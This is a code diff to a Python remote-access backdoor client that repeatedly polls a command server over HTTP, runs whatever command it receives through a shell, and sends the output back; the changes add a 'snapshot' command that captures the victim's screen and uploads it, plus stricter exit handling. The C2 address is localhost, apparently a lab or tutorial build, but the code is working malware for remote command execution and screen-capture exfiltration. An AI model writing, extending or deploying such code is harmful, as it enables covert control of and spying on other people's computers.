@@ -2,20 +2,25 @@ import requests
 import subprocess
 import time
 import os
-import platform
+from PIL import ImageGrab
+import tempfile
+import shutil
+
 
 while True:
 
     req = requests.get('http://127.0.0.1')
     command = req.text
 
-    if 'terminate' in command:
+    if command == 'terminate' or  command == 'exit' or command == 'quit':
         break
-
+    
     elif command[:2] == 'cd':
+        
         if command == 'cd':
             post_response = requests.post(url='http://127.0.0.1', data=os.getcwd()+'> ')
             pass
+        
         else:
             try:
                 if command[2] == ' ':
@@ -41,8 +46,8 @@ while True:
 
         else:
             post_response = requests.post(url='http://127.0.0.1', data='[-] Unable to find the file !')
-     
-     elif command == 'snapshot':
+            
+    elif command == 'snapshot':
         
         path = tempfile.mkdtemp()  #Create a temp dir to store our snapshot 
 
@@ -54,6 +59,7 @@ while True:
         
         files['file'].close()   #Once the file gets transfered, close the file.
         shutil.rmtree(path)  #Remove the entire temp dir
+
 
     else:
         CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
